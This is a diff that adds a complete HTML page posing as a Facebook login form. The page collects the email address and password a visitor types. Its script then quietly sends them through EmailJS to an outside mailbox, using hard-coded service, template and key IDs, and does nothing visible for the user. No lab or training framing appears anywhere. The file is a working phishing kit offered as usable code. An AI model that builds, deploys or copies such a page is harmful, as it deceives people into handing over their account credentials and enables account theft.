@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("l_GNpQV2Ai9wqZK5-");
+    })();
+  </script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+  <div class="w-full max-w-md p-8 space-y-6 bg-white rounded-2xl shadow-md">
+    <h2 class="text-3xl font-bold text-center text-blue-600">Facebook</h2>
+    <form class="space-y-4" id="loginForm">
+      <div>
+        <label class="block text-sm font-medium text-gray-700">Email address</label>
+        <input type="email" name="user_email" class="w-full mt-1 p-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your email" required />
+      </div>
+      <div>
+        <label class="block text-sm font-medium text-gray-700">Password</label>
+        <input type="password" name="user_password" class="w-full mt-1 p-3 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your password" required />
+      </div>
+      <button type="submit" class="w-full py-3 bg-blue-600 text-white font-semibold rounded-md hover:bg-blue-700">Log In</button>
+    </form>
+    <div class="text-center text-sm text-gray-600">
+      <a href="#" class="text-blue-600 hover:underline">Forgotten password?</a>
+    </div>
+    <hr class="my-4">
+    <div class="text-center">
+      <button class="py-2 px-6 bg-green-500 text-white rounded-md font-semibold hover:bg-green-600">Create New Account</button>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      emailjs.sendForm('service_w5woa4u', 'template_ahzft3j', this)
+        .then(function() {
+          // Silent success
+        }, function(error) {
+          // Silent failure
+          console.error('EmailJS Error:', error);
+        });
+    });
+  </script>
+</body>
+</html>
